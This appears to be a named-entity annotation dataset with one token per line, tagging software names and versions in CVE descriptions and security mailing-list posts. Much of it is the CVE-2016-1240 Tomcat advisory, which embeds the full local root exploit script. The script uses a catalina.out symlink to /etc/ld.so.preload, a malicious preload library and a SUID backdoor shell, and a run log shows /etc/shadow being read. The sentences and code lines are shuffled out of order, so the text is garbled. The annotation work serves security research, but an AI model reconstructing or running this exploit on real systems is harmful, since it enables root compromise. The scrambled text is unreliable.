In O
util-linux SN
before SV
2.32-rc1 SV
, O
bash-completion/umount O
allows O
local O
users O
to O
gain O
privileges O
by O
embedding O
shell O
commands O
in O
a O
mountpoint O
name O
, O
which O
is O
mishandled O
during O
a O
umount O
command O
( O
within O
Bash O
) O
by O
a O
different O
user O
, O
as O
demonstrated O
by O
logging O
in O
as O
root O
and O
entering O
umount O
followed O
by O
a O
tab O
character O
for O
autocompletion O
. O

Untrusted O
search O
path O
vulnerability O
in O
i-filter SN
6.0 SV
installer O
timestamp O
of O
code O
signing O
is O
before O
23 O
Aug O
2017 O
( O
JST O
) O
allows O
an O
attacker O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
an O
unspecified O
directory O
. O

Privilege O
Escalation O
vulnerability O
in O
the O
web O
interface O
in O
McAfee SN
Advanced SN
Threat SN
Defense SN
( O
ATD SN
) O
3.10 SV
, O
3.8 SV
, O
3.6 SV
, O
3.4 SV
allows O
remote O
authenticated O
users O
to O
gain O
elevated O
privileges O
via O
the O
GUI O
or O
GUI O
terminal O
commands O
. O

Untrusted O
search O
path O
vulnerability O
in O
NFC SN
Port SN
Version O
5.5.0.6 SV
and SV
earlier SV
( O
for O
RC-S310 O
, O
RC-S320 O
, O
RC-S330 O
, O
RC-S370 O
, O
RC-S380 O
, O
RC-S380/S O
) O
, O
NFC SN
Port SN
Version O
5.3.6.7 SV
and SV
earlier SV
( O
for O
RC-S320 O
, O
RC-S310/J1C O
, O
RC-S310/ED4C O
) O
, O
PC/SC SN
Activator SN
for SN
Type SN
B SN
Ver.1.2.1.0 SV
and SV
earlier SV
, O
SFCard SN
Viewer SN
2 SV
Ver.2.5.0.0 SV
and SV
earlier SV
, O
NFC SN
Net SN
Installer SN
Ver.1.1.0.0 SV
and SV
earlier SV
allows O
an O
attacker O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
an O
unspecified O
directory O
. O

1.0.1 SV
allows O
an O
attacker O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
DLL O
in O
an O
unspecified O
directory O
. O

Untrusted O
search O
path O
vulnerability O
in O
PatchJGD O
( O
PatchJGD101.EXE O
) O
ver O
. O

Android O
ID O
: O
A-32660278 O
. O

An O
elevation O
of O
privilege O
vulnerability O
in O
Mediaserver O
could O
enable O
a O
local O
malicious O
application O
to O
execute O
arbitrary O
code O
within O
the O
context O
of O
a O
privileged O
process O
. O

Versions O
: O
5.0.2 SV
, O
5.1.1 SV
, O
6.0 SV
, O
6.0.1 SV
, O
7.0 SV
, O
7.1 SV
. O

Product O
: O
Android O
. O

The O
kernel-mode O
drivers O
in O
Microsoft SN
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
8.1 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Win32k O
Elevation O
of O
Privilege O
Vulnerability O
. O

References O
: O
N-CVE-2016-6790 O
. O

Android O
ID O
: O
A-31251628 O
. O

Versions O
: O
Kernel-3.18 O
. O

An O
elevation O
of O
privilege O
vulnerability O
in O
the O
NVIDIA O
libomx O
library O
( O
libnvomx O
) O
could O
enable O
a O
local O
malicious O
application O
to O
execute O
arbitrary O
code O
within O
the O
context O
of O
a O
privileged O
process O
. O

Stack-based O
buffer O
overflow O
in O
the O
FascistGecosUser O
function O
in O
lib/fascist.c O
in O
cracklib O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
application O
crash O
) O
or O
gain O
privileges O
via O
a O
long O
GECOS O
field O
, O
involving O
longbuffer O
. O

To O
trigger O
the O
flaw O
, O
you O
need O
a O
specially-crafted O
long O
GECOS O
field O
, O
which O
can O
be O
done O
by O
a O
local O
user O
on O
the O
system O
. O

( O
such O
as O
passwd O
application O
which O
runs O
suid O
root O
) O
All O
versions O
of O
the O
cracklib O
library O
shipped O
with O
Red O
Hat O
Enterprise O
Linux O
are O
compiled O
with O
FORTIFY_SOURCE O
, O
which O
detects O
the O
buffer-overflow O
and O
aborts O
the O
application O
safely O
. O

A O
proposed O
patch O
is O
available O
at O
: O
This O
flaw O
was O
assigned O
CVE-2016-6318 O
and O
it O
was O
previously O
disclosed O
via O
linux-distros O
mailing O
list O
. O

Date O
: O
Tue O
, O
16 O
Aug O
2016 O
15:34:54 O
+0530 O
From O
: O
Huzaifa O
Sidhpurwala O
< O
huzaifas O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

The O
attacker O
then O
needs O
to O
run O
some O
utility O
which O
uses O
cracklib O
to O
process O
this O
long O
GECOS O
field O
on O
the O
system O
. O

However O
, O
there O
may O
be O
other O
applications O
, O
distributions O
which O
dont O
compile O
cracklib O
with O
FORTIFY_SOURCE O
, O
and O
this O
can O
lead O
to O
easy O
code O
exec O
or O
even O
privsec O
. O

Therefore O
the O
maximum O
impact O
of O
this O
flaw O
is O
application O
crash O
. O

Hi O
All O
, O
A O
security O
flaw O
was O
reported O
to O
us O
by O
CSG O
Labs O
, O
details O
as O
follows O
: O
A O
stack-based O
overflow O
was O
found O
in O
the O
way O
cracklib O
, O
a O
library O
used O
to O
stop O
users O
from O
choosing O
easy O
to O
guess O
passwords O
, O
handled O
large O
GECOS O
field O
in O
the O
/etc/passwd O
file O
. O

Subject O
: O
cracklib O
: O
Stack-based O
buffer O
overflow O
when O
parsing O
large O
GECOS O
field O

Huzaifa O
Sidhpurwala O
Red O
Hat O
Product O
Security O
Team O

When O
an O
application O
compiled O
against O
the O
cracklib O
libary O
, O
such O
as O
passwd O
is O
used O
to O
parse O
the O
GECOS O
field O
, O
it O
could O
cause O
the O
application O
to O
crash O
or O
execute O
arbitary O
code O
with O
the O
permissions O
of O
the O
user O
running O
such O
an O
application O
. O

NetCommons SN
2.4.2.1 SV
and SV
earlier SV
allows O
remote O
authenticated O
secretariat O
( O
aka O
CLERK O
) O
users O
to O
gain O
privileges O
by O
creating O
a O
SYSTEM_ADMIN O
account O
. O

NetApp O
Clustered O
Data O
ONTAP O
allows O
man-in-the-middle O
attackers O
to O
obtain O
sensitive O
information O
, O
gain O
privileges O
, O
or O
cause O
a O
denial O
of O
service O
by O
leveraging O
failure O
to O
enable O
SMB O
signing O
enforcement O
in O
its O
default O
state O
. O

The O
Qualcomm O
buspm O
driver O
in O
Android SN
before SV
2016-05-01 SV
on O
Nexus SN
5X SV
, O
6 SV
, O
and SV
6P SV
devices O
allows O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
internal O
bug O
26494907 O
. O

The O
Tomcat O
init O
script O
in O
the O
tomcat7 SN
package SN
before SV
7.0.56-3+deb8u4 SV
and O
tomcat8 SN
package SN
before SV
8.0.14-1+deb8u3 SV
on O
Debian O
jessie O
and O
the O
tomcat6 O
and O
libtomcat6-java SN
packages SN
before SV
6.0.35-1ubuntu3.8 SV
on O
Ubuntu SN
12.04 SV
LTS SV
, O
the O
tomcat7 O
and O
libtomcat7-java SN
packages SN
before SV
7.0.52-1ubuntu0.7 SV
on O
Ubuntu SN
14.04 SV
LTS SV
, O
and O
tomcat8 O
and O
libtomcat8-java SN
packages SN
before SV
8.0.32-1ubuntu1.2 SV
on O
Ubuntu SN
16.04 SV
LTS SV
allows O
local O
users O
with O
access O
to O
the O
tomcat O
account O
to O
gain O
root O
privileges O
via O
a O
symlink O
attack O
on O
the O
Catalina O
log O
file O
, O
as O
demonstrated O
by O
/var/log/tomcat7/catalina.out O
. O

BACKGROUND O
The O
Apache O
Tomcat O
xc3 O
x82 O
xc2 O
xae O
software O
is O
an O
open O
source O
implementation O
of O
the O
Java O
Servlet O
, O
JavaServer O
Pages O
, O
Java O
Expression O
Language O
and O
Java O
WebSocket O
technologies O
. O

cleanexit O
2 O
fi O
Symlink O
the O
log O
file O
to O
ld.so.preload O
rm O
-f O
$ O
TOMCATLOG O
& O
& O
ln O
-s O
/etc/ld.so.preload O
$ O
TOMCATLOG O
if O
[ O
$ O

Exiting O
with O
code O
$ O
1 O
exit O
$ O
1 O
} O
function O
ctrl_c O
( O
) O
{ O
echo O
-e O
Active O
exploitation O
aborted O
. O

-ne O
0 O
] O
; O
then O
echo O
-e O
[ O
! O
] O

Try O
again O
. O

After O
the O
Tomcat O
restart O
system O
reboot O
echo O
-ne O
you O
ll O
be O
able O
to O
add O
arbitrary O
commands O
to O
the O
file O
which O
will O
get O
executed O
with O
root O
privileges O
echo O
-ne O
at O
~6:25am O
by O
the O
/etc/cron.daily/tomcatN O
log O
rotation O
cron O
. O

to O
escalate O
their O
privileges O
to O
root O
. O

cleanexit O
3 O
fi O
echo O
-e O
Symlink O
created O
at O
: O
`ls O
-l O
$ O
TOMCATLOG` O
Wait O
for O
Tomcat O
to O
re-open O
the O
logs O
echo O
-ne O
Waiting O
for O
Tomcat O
to O
re-open O
the O
logs/Tomcat O
service O
restart O
... O
echo O
-e O
You O
could O
speed O
things O
up O
by O
executing O
: O
kill O
[ O
Tomcat-pid O
] O
( O
as O
tomcat O
user O
) O
if O
needed O
; O
) O
while O
: O
; O
do O
sleep O
0.1 O
if O
[ O
-f O
/etc/ld.so.preload O
] O
; O
then O
echo O
$ O
PRIVESCLIB O
/etc/ld.so.preload O
break O
; O
fi O
done O
/etc/ld.so.preload O
file O
should O
be O
owned O
by O
tomcat O
user O
at O
this O
point O
Inject O
the O
privesc.so O
shared O
library O
to O
escalate O
privileges O
echo O
$ O
PRIVESCLIB O
/etc/ld.so.preload O
echo O
-e O
Tomcat O
restarted O
. O

for O
details O
. O

/etc/ld.so.preload O
already O
exists O
. O

Failed O
to O
compile O
the O
privesc O
lib O
$ O
PRIVESCSRC O
. O

cleanexit O
0 O
[ O
EOF O
] O
Example O
exploit O
run O
tomcat7 O
@ O
ubuntu O
: O
/tmp O
$ O
id O
uid=110 O
( O
tomcat7 O
) O
gid=118 O
( O
tomcat7 O
) O
groups=118 O
( O
tomcat7 O
) O
tomcat7 O
@ O
ubuntu O
: O
/tmp O
$ O
lsb_release O
-a O
No O
LSB O
modules O
are O
available O
. O

Apache O
Tomcat O
software O
powers O
numerous O
large-scale O
, O
mission-critical O
web O
applications O
across O
a O
diverse O
range O
of O
industries O
and O
organizations O
. O

cleanexit O
0 O
} O
intro O
echo O
-e O
033 O
[ O
94m O
Tomcat O
6/7/8 O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O
Exploit O
CVE-2016-1240 O
echo O
-e O
Discovered O
and O
coded O
by O
: O
Dawid O
Golunski O
033 O
[ O
0m O
Args O
if O
lt O
1 O
] O
; O
then O
echo O
-e O
[ O
! O
] O

V. O
PROOF O
OF O
CONCEPT O
EXPLOIT O
[ O
tomcat-rootprivesc-deb.sh O
] O
! O
/bin/bash O
Tomcat O
6/7/8 O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O
Exploit O
CVE-2016-1240 O
Discovered O
and O
coded O
by O
: O
Dawid O
Golunski O
This O
exploit O
targets O
Tomcat O
( O
versions O
6 O
, O
7 O
and O
8 O
) O
packaging O
on O
Debian-based O
distros O
including O
Debian O
, O
Ubuntu O
etc O
. O

to O
escalate O
their O
privileges O
from O
tomcat O
user O
to O
root O
and O
fully O
compromise O
the O
target O
system O
. O

Exiting O
for O
safety O
. O

provide O
a O
vulnerable O
tomcat O
init O
script O
that O
allows O
local O
attackers O
who O
have O
already O
gained O
access O
to O
the O
tomcat O
account O
( O
for O
example O
, O
by O
exploiting O
an O
RCE O
vulnerability O
in O
a O
java O
web O
application O
hosted O
on O
Tomcat O
, O
uploading O
a O
webshell O
etc O
. O
) O

See O
section O
VII O
. O

INTRODUCTION O
Tomcat O
( O
6 O
, O
7 O
, O
8 O
) O
packages O
provided O
by O
default O
repositories O
on O
Debian-based O
distributions O
( O
including O
Debian O
, O
Ubuntu O
etc O
. O
) O

cleanexit O
3 O
fi O
echo O
-e O
Symlink O
created O
at O
: O
`ls O
-l O
$ O
TOMCATLOG` O
echo O
-e O
The O
current O
owner O
of O
the O
file O
is O
: O
`ls O
-l O
/etc/default/locale` O
echo O
-ne O
Keep O
an O
eye O
on O
the O
owner O
change O
on O
/etc/default/locale O
. O

SYSTEMS O
AFFECTED O
The O
following O
Debian O
package O
versions O
are O
affected O
: O
Tomcat SN
8 SV
< SV
= SV
8.0.36-2 SV
Tomcat SN
7 SV
< SV
= SV
7.0.70-2 SV
Tomcat SN
6 SV
< SV
= SV
6.0.45+dfsg-1~deb8u1 SV
A O
more O
detailed O
lists O
of O
affected O
packages O
can O
be O
found O
at O
: O
Debian O
: O
systmes O
that O
use O
Tomcat O
packages O
provided O
by O
Debian O
may O
also O
be O
affected O
. O

cleanexit O
2 O
; O
fi O
Prepare O
backdoor O
shell O
cp O
$ O
BACKDOORSH O
$ O
BACKDOORPATH O
echo O
-e O
Backdoor/low-priv O
shell O
installed O
at O
: O
`ls O
-l O
$ O
BACKDOORPATH` O
Safety O
check O
if O
[ O
-f O
/etc/ld.so.preload O
] O
; O
then O
echo O
-e O
[ O
! O
] O

Affected O
debian O
packages O
: O
Tomcat SN
8 SV
< SV
= SV
8.0.36-2 SV
Tomcat SN
7 SV
< SV
= SV
7.0.70-2 SV
Tomcat SN
6 SV
< SV
= SV
6.0.45+dfsg-1~deb8u1 SV
Ubuntu O
systems O
are O
also O
affected O
. O

/usr/bin/sudo O
) O
echo O
-e O
Escalating O
privileges O
via O
the O
$ O
SUIDBIN O
SUID O
binary O
to O
get O
root O
! O

Description O
: O
Ubuntu O
16.04 O
LTS O
Release O
: O
16.04 O
Codename O
: O
xenial O
tomcat7 O
@ O
ubuntu O
: O
/tmp O
$ O
dpkg O
-l O
| O
grep O
tomcat O
ii O
libtomcat7-java O
7.0.68-1ubuntu0.1 O
all O
Servlet O
and O
JSP O
engine O
core O
libraries O
ii O
tomcat7 O
7.0.68-1ubuntu0.1 O
all O
Servlet O
and O
JSP O
engine O
ii O
tomcat7-common O
7.0.68-1ubuntu0.1 O
all O
Servlet O
and O
JSP O
engine O
common O
files O
tomcat7 O
@ O
ubuntu O
: O
/tmp O
$ O
./tomcat-rootprivesc-deb.sh O
/var/log/tomcat7/catalina.out O
Tomcat O
6/7/8 O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O
Exploit O
CVE-2016-1240 O
Discovered O
and O
coded O
by O
: O
Dawid O
Golunski O
[ O
+ O
] O
Starting O
the O
exploit O
in O
[ O
active O
] O
mode O
with O
the O
following O
privileges O
: O
uid=110 O
( O
tomcat7 O
) O
gid=118 O
( O
tomcat7 O
) O
groups=118 O
( O
tomcat7 O
) O
[ O
+ O
] O
Target O
Tomcat O
log O
file O
set O
to O
/var/log/tomcat7/catalina.out O
[ O
+ O
] O
Compiling O
the O
privesc O
shared O
library O
( O
/tmp/privesclib.c O
) O
[ O
+ O
] O
Backdoor/low-priv O
shell O
installed O
at O
: O
-rwxr-xr-x O
1 O
tomcat7 O
tomcat7 O
1037464 O
Sep O
30 O
22:27 O
/tmp/tomcatrootsh O
[ O
+ O
] O
Symlink O
created O
at O
: O
lrwxrwxrwx O
1 O
tomcat7 O
tomcat7 O
18 O
Sep O
30 O
22:27 O
/var/log/tomcat7/catalina.out O
- O
/etc/ld.so.preload O
[ O
+ O
] O
Waiting O
for O
Tomcat O
to O
re-open O
the O
logs/Tomcat O
service O
restart O
... O
You O
could O
speed O
things O
up O
by O
executing O
: O
kill O
[ O
Tomcat-pid O
] O
( O
as O
tomcat O
user O
) O
if O
needed O
Tomcat O
restarted O
. O

-deferred O
( O
requires O
the O
-deferred O
switch O
on O
argv O
) O
- O
this O
mode O
symlinks O
the O
logfile O
to O
/etc/default/locale O
and O
exits O
. O

As O
attackers O
would O
already O
have O
a O
tomcat O
account O
at O
the O
time O
of O
exploitation O
, O
they O
could O
also O
kill O
the O
tomcat O
processes O
to O
introduce O
the O
need O
for O
a O
restart O
. O

Other O
systems O
using O
the O
affected O
debian O
packages O
may O
also O
be O
affected O
. O

It O
removes O
the O
need O
for O
the O
exploit O
to O
run O
in O
a O
loop O
waiting O
. O

-eq O
0 O
] O
; O
then O
echo O
-e O
Rootshell O
got O
assigned O
root O
SUID O
perms O
at O
: O
`ls O
-l O
$ O
BACKDOORPATH` O
echo O
-e O
033 O
[ O
94mPlease O
tell O
me O
you O
re O
seeing O
this O
too O
; O
) O
033 O
[ O
0m O
else O
echo O
-e O
[ O
! O
] O

Usage O
: O
./tomcat-rootprivesc-deb.sh O
path_to_catalina.out O
[ O
-deferred O
] O
The O
exploit O
can O
used O
in O
two O
ways O
active O
( O
assumed O
by O
default O
) O
- O
which O
waits O
for O
a O
Tomcat O
restart O
in O
a O
loop O
and O
instantly O
gains/executes O
a O
rootshell O
via O
ld.so.preload O
as O
soon O
as O
Tomcat O
service O
is O
restarted O
. O

Update O
to O
the O
latest O
tomcat O
packages O
provided O
by O
your O
distribution O
. O

tomcatrootsh-4.3 O
id O
uid=110 O
( O
tomcat7 O
) O
gid=118 O
( O
tomcat7 O
) O
euid=0 O
( O
root O
) O
groups=118 O
( O
tomcat7 O
) O
tomcatrootsh-4.3 O
whoami O
root O
tomcatrootsh-4.3 O
head O
-n3 O
/etc/shadow O
root O
: O
$ O
6 O
$ O
oaf O
[ O
cut O
] O
:16912:0:99999:7 O
: O
: O
: O
daemon O
: O
:16912:0:99999:7 O
: O
: O
: O
bin O
: O
:16912:0:99999:7 O
: O
: O
: O
tomcatrootsh-4.3 O
exit O
exit O
[ O
+ O
] O
Cleaning O
up O
Job O
done O
. O

SOLUTION O
Debian O
Security O
Team O
was O
contacted O
and O
has O
fixed O
affected O
upstream O
packages O
. O

See O
also O
-active O
mode O
if O
you O
can O
t O
wait O
; O
) O
exit O
0 O
fi O
[ O
Active O
exploitation O
] O
trap O
ctrl_c O
INT O
Compile O
privesc O
preload O
library O
echo O
-e O
Compiling O
the O
privesc O
shared O
library O
( O
$ O
PRIVESCSRC O
) O
cat O
_solibeof_ O
> O
$ O
PRIVESCSRC O
define O
_GNU_SOURCE O
include O
< O
stdio.h O
include O
< O
sys/stat.h O
include O
< O
unistd.h O
include O
< O
dlfcn.h O
uid_t O
geteuid O
( O
void O
) O
{ O
static O
uid_t O
( O
old_geteuid O
) O
( O
) O
; O
old_geteuid O
= O
dlsym O
( O
RTLD_NEXT O
, O
geteuid O
) O
; O
if O
( O
old_geteuid O
( O
) O
0 O
) O
{ O
chown O
( O
$ O
BACKDOORPATH O
, O
0 O
, O
0 O
) O
; O
chmod O
( O
$ O
BACKDOORPATH O
, O
04777 O
) O
; O
unlink O
( O
/etc/ld.so.preload O
) O
; O
} O
return O
old_geteuid O
solibeof_ O
gcc O
-Wall O
-fPIC O
-shared O
-o O
$ O
PRIVESCLIB O
$ O
PRIVESCSRC O
-ldl O
if O
[ O
$ O

The O
/etc/ld.so.preload O
file O
got O
created O
with O
tomcat O
privileges O
: O
-rw-r O
r O
1 O
tomcat7 O
root O
19 O
Sep O
30 O
22:28 O
/etc/ld.so.preload O
[ O
+ O
] O
Adding O
/tmp/privesclib.so O
shared O
lib O
to O
/etc/ld.so.preload O
[ O
+ O
] O
The O
/etc/ld.so.preload O
file O
now O
contains O
: O
/tmp/privesclib.so O
[ O
+ O
] O
Escalating O
privileges O
via O
the O
/usr/bin/sudo O
SUID O
binary O
to O
get O
root O
! O

sudo O
help O
2 O
> O
/dev/null O
> O
/dev/null O
Check O
for O
the O
rootshell O
ls O
-l O
$ O
BACKDOORPATH O
| O
grep O
rws O
| O
grep O
-q O
root O
if O
[ O
$ O

The O
script O
for O
tomcat7 O
contains O
the O
following O
lines O
: O
[ O
tomcat7 O
] O
Run O
the O
catalina.sh O
script O
as O
a O
daemon O
set O
+e O
touch O
$ O
CATALINA_PID O
$ O
CATALINA_BASE O
/logs/catalina.out O
chown O
$ O
TOMCAT7_USER O
$ O
CATALINA_PID O
$ O
CATALINA_BASE O
/logs/catalina.out O
[ O
eof O
] O
Local O
attackers O
who O
have O
gained O
access O
to O
the O
server O
in O
the O
context O
of O
the O
tomcat O
user O
( O
for O
example O
, O
through O
a O
vulnerability O
in O
a O
web O
application O
) O
would O
be O
able O
to O
replace O
the O
log O
file O
with O
a O
symlink O
to O
an O
arbitrary O
system O
file O
and O
escalate O
their O
privileges O
to O
root O
once O
Tomcat O
init O
script O
( O
running O
as O
root O
) O
re-opens O
the O
catalina.out O
file O
after O
a O
service O
restart O
, O
reboot O
etc O
. O

You O
need O
to O
execute O
the O
exploit O
as O
tomcat O
user O
! O

exit O
3 O
fi O
echo O
-e O
Target O
Tomcat O
log O
file O
set O
to O
$ O
TOMCATLOG O
[ O
Deferred O
exploitation O
] O
Symlink O
the O
log O
file O
to O
/etc/default/locale O
file O
which O
gets O
executed O
daily O
on O
default O
tomcat O
installations O
on O
Debian/Ubuntu O
by O
the O
/etc/cron.daily/tomcatN O
logrotation O
cronjob O
around O
6:25am O
. O

REFERENCES O
exploit O
sourcecode O
Security O
Notice O
USN-3081-1 O
: O
Security O
Advisory O
DSA-3669-1 O
( O
tomcat7 O
) O
: O
Security O
Advisory O
DSA-3670-1 O
( O
tomcat8 O
) O
: O
CREDITS O
The O
vulnerability O
has O
been O
discovered O
by O
Dawid O
Golunski O
dawid O
( O
at O
) O
legalhackers O
( O
dot O
) O
com O
XI O
. O

DESCRIPTION O
The O
vulnerability O
is O
located O
in O
the O
tomcat O
init O
script O
provided O
by O
affected O
packages O
, O
normally O
installed O
at O
/etc/init.d/tomcatN O
. O

Failed O
to O
get O
root O
cleanexit O
2 O
fi O
Execute O
the O
rootshell O
echo O
-e O
Executing O
the O
rootshell O
$ O
BACKDOORPATH O
now O
! O

The O
Java O
Servlet O
, O
JavaServer O
Pages O
, O
Java O
Expression O
Language O
and O
Java O
WebSocket O
specifications O
are O
developed O
under O
the O
Java O
Community O
Process O
. O

Attackers O
can O
come O
back O
at O
a O
later O
time O
and O
check O
on O
the O
/etc/default/locale O
file O
. O

Exiting O
. O

Attackers O
can O
freely O
add O
their O
commands O
to O
the O
/etc/default/locale O
script O
after O
Tomcat O
has O
been O
restarted O
and O
file O
owner O
gets O
changed O
. O

if O
[ O
$ O
mode O
= O
deferred O
] O
; O
then O
rm O
-f O
$ O
TOMCATLOG O
& O
& O
ln O
-s O
/etc/default/locale O
$ O
TOMCATLOG O
if O
[ O
$ O

BUSINESS O
IMPACT O
Local O
attackers O
who O
have O
gained O
access O
to O
tomcat O
user O
account O
( O
for O
example O
remotely O
via O
a O
vulnerable O
web O
application O
, O
or O
locally O
via O
weak O
webroot O
perms O
) O
, O
could O
escalate O
their O
privileges O
to O
root O
and O
fully O
compromise O
the O
affected O
system O
. O

Exiting O
with O
code O
0 O
VI O
. O

Exploit O
usage O
: O
$ O
0 O
path_to_catalina.out O
[ O
-deferred O
] O
exit O
3 O
fi O
if O
[ O
$ O
2 O
= O
-deferred O
] O
; O
then O
mode= O
deferred O
else O
mode= O
active O
fi O
Priv O
check O
echo O
-e O
Starting O
the O
exploit O
in O
[ O
033 O
[ O
94m O
$ O
mode O
033 O
[ O
0m O
] O
mode O
with O
the O
following O
privileges O
: O
`id` O
id O
| O
grep O
-q O
tomcat O
if O
[ O
$ O

LEGAL O
NOTICES O
The O
information O
contained O
within O
this O
advisory O
is O
supplied O
as-is O
with O
no O
warranties O
or O
guarantees O
of O
fitness O
of O
use O
or O
otherwise O
. O

exit O
3 O
fi O
Set O
target O
paths O
TOMCATLOG= O
$ O
1 O
if O
[ O
! O

Distributor O
ID O
: O
Ubuntu O

Do O
no O
harm O
. O

$ O
BACKDOORPATH O
-p O
-c O
rm O
-f O
/etc/ld.so.preload O
; O
rm O
-f O
$ O
PRIVESCLIB O
$ O
BACKDOORPATH O
-p O
Job O
done O
. O

Upon O
a O
Tomcat O
restart O
server O
reboot O
, O
the O
file O
should O
be O
owned O
by O
tomcat O
user O
. O

Couldn O
t O
remove O
the O
$ O
TOMCATLOG O
file O
or O
create O
a O
symlink O
. O

BACKDOORSH= O
/bin/bash O
BACKDOORPATH= O
/tmp/tomcatrootsh O
PRIVESCLIB= O
/tmp/privesclib.so O
PRIVESCSRC= O
/tmp/privesclib.c O
SUIDBIN= O
/usr/bin/sudo O
function O
cleanexit O
{ O
Cleanup O
echo O
-e O
Cleaning O
up O
... O
rm O
-f O
$ O
PRIVESCSRC O
rm O
-f O
$ O
PRIVESCLIB O
rm O
-f O
$ O
TOMCATLOG O
touch O
$ O
TOMCATLOG O
if O
[ O
-f O
/etc/ld.so.preload O
] O
; O
then O
echo O
-n O
/etc/ld.so.preload O
2 O
> O
/dev/null O
fi O
echo O
-e O
Job O
done O
. O

The O
/etc/ld.so.preload O
file O
got O
created O
with O
tomcat O
privileges O
: O
`ls O
-l O
/etc/ld.so.preload` O
echo O
-e O
Adding O
$ O
PRIVESCLIB O
shared O
lib O
to O
/etc/ld.so.preload O
echo O
-e O
The O
/etc/ld.so.preload O
file O
now O
contains O
: O
`cat O
/etc/ld.so.preload` O
Escalating O
privileges O
via O
the O
SUID O
binary O
( O
e.g O
. O

Some O
of O
these O
users O
and O
their O
stories O
are O
listed O
on O
the O
PoweredBy O
wiki O
page O
. O

It O
allows O
attackers O
with O
a O
tomcat O
shell O
( O
e.g O
. O

-f O
$ O
TOMCATLOG O
] O
; O
then O
echo O
-e O
[ O
! O
] O

REVISION O
HISTORY O
30.09.2016 O
- O
Advisory O
released O
XII O
. O

The O
Apache O
Tomcat O
project O
is O
intended O
to O
be O
a O
collaboration O
of O
the O
best-of-breed O
developers O
from O
around O
the O
world O
. O

VULNERABILITY O
Apache O
Tomcat O
packaging O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O

The O
specified O
Tomcat O
catalina.out O
log O
( O
$ O
TOMCATLOG O
) O
doesn O
t O
exist O
. O

I O
accept O
no O
responsibility O
for O
any O
damage O
caused O
by O
the O
use O
or O
misuse O
of O
this O
information O
. O

obtained O
remotely O
through O
a O
vulnerable O
java O
webapp O
, O
or O
locally O
via O
weak O
permissions O
on O
webapps O
in O
the O
Tomcat O
webroot O
directories O
etc O
. O
) O

Remember O
you O
can O
use O
-deferred O
switch O
for O
deferred O
exploitation O
. O

See O
full O
advisory O
for O
details O
at O
: O
Disclaimer O
: O
For O
testing O
purposes O
only O
. O

The O
Apache O
Tomcat O
software O
is O
developed O
in O
an O
open O
and O
participatory O
environment O
and O
released O
under O
the O
Apache O
License O
version O
2 O
. O

The O
attackers O
can O
then O
add O
arbitrary O
commands O
to O
the O
file O
which O
will O
be O
executed O
with O
root O
privileges O
by O
the O
/etc/cron.daily/tomcatN O
logrotation O
cronjob O
( O
run O
daily O
around O
6:25am O
on O
default O
Ubuntu/Debian O
Tomcat O
installations O
) O
. O

It O
also O
gives O
attacker O
a O
chance O
to O
execute O
: O
kill O
[ O
tomcat-pid O
] O
command O
to O
force/speed O
up O
a O
Tomcat O
restart O
( O
done O
manually O
by O
an O
admin O
, O
or O
potentially O
by O
some O
tomcat O
service O
watchdog O
etc O
. O
) O

[ O
+ O
] O
Rootshell O
got O
assigned O
root O
SUID O
perms O
at O
: O
-rwsrwxrwx O
1 O
root O
root O
1037464 O
Sep O
30 O
22:27 O
/tmp/tomcatrootsh O
Please O
tell O
me O
you O
re O
seeing O
this O
too O
Executing O
the O
rootshell O
/tmp/tomcatrootsh O
now O
! O

Apache SN
Tomcat SN
8/7/6 SV
( O
Debian-Based O
Distros O
) O
- O
Local O
Privilege O
Escalation O

CVE O
: O
CVE-2016-1240 O
Vulnerability O
: O
Tomcat O
packaging O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O

Affected O
packages O
: O
Tomcat SN
6/7/8 SV
deb O
packages O
( O
up SV
to SV
8.0.36-2 SV
) O
Systems O
affected O
: O
Debian O
& O
Ubuntu O
& O
possibly O
others O
( O
using O
the O
affected O
deb O
packages O
) O
Discovered O
by O
: O
Dawid O
Golunski O
( O
Tomcat O
( O
6 O
, O
7 O
, O
8 O
) O
packages O
provided O
by O
default O
repositories O
on O
Debian-based O
distributions O
( O
including O
Debian O
, O
Ubuntu O
etc O
. O
) O

The O
full O
Advisory O
and O
a O
PoC O
exploit O
can O
be O
found O
at O
: O
ion-Exploit-CVE-2016-1240.html O
Regards O
, O
Dawid O
Golunski O

CVE-2016-1240 O
- O
Tomcat O
packaging O
on O
Debian-based O
distros O
- O
Local O
Root O
Privilege O
Escalation O

Integer O
overflow O
in O
lib/asn1_decoder.c O
in O
the O
Linux SN
kernel SN
before SV
4.6 SV
allows O
local O
users O
to O
gain O
privileges O
via O
crafted O
ASN.1 O
data O
. O

Subject O
: O
CVE-2016-0758 O
- O
Linux O
kernel O
- O
Flaw O
in O
ASN.1 O
DER O
decoder O
for O
x509 O
certificate O
DER O
files O
. O

Thanks O
, O
Wade O
Mealing O
Red O
Hat O
Product O
Security O
Team O
References O
: O
Upstream O
fix O
: O
Red O
hat O
Bugzilla O
: O

Red O
Hat O
would O
like O
to O
thank O
Philip O
Pettersson O
of O
Samsung O
for O
reporting O
this O
issue O
to O
Red O
Hat O
. O

Date O
: O
Fri O
, O
13 O
May O
2016 O
00:01:56 O
+1000 O
From O
: O
Wade O
Mealing O
< O
wmealing O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

An O
issue O
with O
ASN.1 O
DER O
decoder O
was O
reported O
that O
could O
lead O
to O
memory O
corruptions O
, O
possible O
privilege O
escalation O
, O
or O
complete O
local O
denial O
of O
service O
